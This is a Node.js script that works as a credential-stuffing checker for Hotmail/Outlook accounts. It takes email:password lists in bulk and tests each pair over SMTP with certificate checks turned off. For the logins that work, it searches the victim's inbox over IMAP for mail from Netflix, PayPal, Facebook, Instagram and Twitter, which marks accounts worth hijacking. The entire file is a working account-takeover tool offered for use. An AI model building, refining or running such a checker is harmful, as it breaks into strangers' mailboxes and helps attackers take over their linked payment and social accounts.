const nodemailer = require('nodemailer');
const fs = require('fs');
const fsp = require('fs').promises;
const path = require('path');
const readline = require('readline');
const { ImapFlow } = require('imapflow');
const chalk = require('chalk');

const filters = {
    Netflix: false,
    PayPal: false,
    Facebook: false,
    Instagram: false,
    Twitter: false
};

const stats = {
    total: 0,
    checked: 0,
    live: 0,
    dead: 0,
    startTime: null,
};

async function askFilterPreference(filterName) {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    return new Promise(resolve => {
        rl.question(`Enable ${filterName} filter? (y/n): `, answer => {
            rl.close();
            resolve(answer.toLowerCase() === 'y');
        });
    });
}

async function ensureFolderExists(folderPath) {
    try {
        await fsp.access(folderPath);
    } catch {
        await fsp.mkdir(folderPath, { recursive: true });
    }
}

async function getInputFiles() {
    const inputFolder = path.join(process.cwd(), 'input');
    await ensureFolderExists(inputFolder);

    const files = await fsp.readdir(inputFolder);
    const txtFiles = files.filter(file => file.endsWith('.txt'));

    if (txtFiles.length === 0) {
        console.error(chalk.red('No .txt files found in the input folder.'));
        process.exit(1);
    }

    return txtFiles.map(file => path.join(inputFolder, file));
}

async function checkEmail(line, liveWriter, deadWriter) {
    const [emailAndPass] = line.split(' | ');
    const [email, password] = emailAndPass.split(':');

    const transporter = nodemailer.createTransport({
        service: 'hotmail',
        auth: { user: email, pass: password },
        tls: { rejectUnauthorized: false },
        connectionTimeout: 60000
    });

    try {
        await transporter.verify();
        stats.live++;
        let liveEntry = emailAndPass;

        const client = new ImapFlow({
            host: 'outlook.office365.com',
            port: 993,
            secure: true,
            auth: {
                user: email,
                pass: password
            },
            logger: false
        });

        if (Object.values(filters).some(f => f)) {
            try {
                await client.connect();
                await client.mailboxOpen('INBOX');

                const results = await Promise.all(Object.entries(filters).map(async ([filterName, enabled]) => {
                    if (!enabled) return false;
                    const address = {
                        Netflix: 'info@account.netflix.com',
                        PayPal: 'service@paypal.com',
                        Facebook: 'notification@facebookmail.com',
                        Instagram: 'no-reply@mail.instagram.com',
                        Twitter: 'info@twitter.com'
                    }[filterName];

                    const messages = await client.search({ from: address }, { limit: 1 });
                    return messages.length > 0;
                }));

                Object.keys(filters).forEach((filterName, index) => {
                    if (results[index]) liveEntry += ` | ${filterName} ✅`;
                });

                await client.logout();
            } catch (imapError) {
                deadWriter.write(emailAndPass + '\n');
                readline.clearLine(process.stdout, 0);
                readline.cursorTo(process.stdout, 0);
                console.log(chalk.yellow(`Failed to fetch emails for: ${email}`));
            }
        }

        liveWriter.write(liveEntry + '\n');
        readline.clearLine(process.stdout, 0);
        readline.cursorTo(process.stdout, 0);
        console.log(chalk.green(`✅ ${liveEntry}`));
    } catch (error) {
        stats.dead++;
        deadWriter.write(emailAndPass + '\n');
        readline.clearLine(process.stdout, 0);
        readline.cursorTo(process.stdout, 0);
        console.log(chalk.red(`❌ ${email}`));
    }

    stats.checked++;
    updateStatus();
}

let statusInterval;

function updateStatus() {
    const elapsedTimeInMinutes = (Date.now() - stats.startTime) / 60000; // Convert to minutes
    const emailsPerMinute = (stats.checked / elapsedTimeInMinutes).toFixed(2);
    const remainingCount = stats.total - stats.checked;

    readline.cursorTo(process.stdout, 0, process.stdout.rows);
    readline.clearLine(process.stdout, 0);
    process.stdout.write(
        chalk.cyan(`Total: ${stats.total} | Checked: ${stats.checked} | Live: ${stats.live} | Dead: ${stats.dead} | Remaining: ${remainingCount} | Speed: ${emailsPerMinute}/min`)
    );
}


async function processFile(inputFile) {
    const outputFolder = path.join(process.cwd(), 'output');
    await ensureFolderExists(outputFolder);

    const baseName = path.basename(inputFile, '.txt');
    const liveFile = path.join(outputFolder, `${baseName}_live.txt`);
    const deadFile = path.join(outputFolder, `${baseName}_dead.txt`);

    const liveWriter = fs.createWriteStream(liveFile, { flags: 'a' });
    const deadWriter = fs.createWriteStream(deadFile, { flags: 'a' });

    const currentDate = new Date().toLocaleString();
    const logHeader = `Date: ${currentDate}\nFile: ${inputFile}\n\n`;
    liveWriter.write(logHeader);
    deadWriter.write(logHeader);

    console.log(chalk.blue(logHeader));
    console.log(chalk.blue(`Filters - ${Object.entries(filters).map(([name, enabled]) => `${name}: ${enabled ? '✅ON' : '❌OFF'}`).join(', ')}`));

    const data = await fsp.readFile(inputFile, 'utf8');
    const lines = data.trim().split('\n');
    stats.total += lines.length;

    console.log('\n');

    stats.startTime = Date.now();

    statusInterval = setInterval(updateStatus, 1000);

    const batchSize = 10;
    for (let i = 0; i < lines.length; i += batchSize) {
        const batch = lines.slice(i, i + batchSize);
        await Promise.all(batch.map(line => checkEmail(line, liveWriter, deadWriter)));
    }

    clearInterval(statusInterval);
    liveWriter.end();
    clearInterval(statusInterval);
    deadWriter.end();
}

async function main() {
    for (const filterName of Object.keys(filters)) {
        filters[filterName] = await askFilterPreference(filterName);
    }

    const inputFiles = await getInputFiles();
    stats.startTime = Date.now();

    for (const inputFile of inputFiles) {
        await processFile(inputFile);
    }

    console.log(chalk.blue('\nAuthentication process completed.'));
    updateStatus();
    console.log('\n');
}

main().catch(console.error);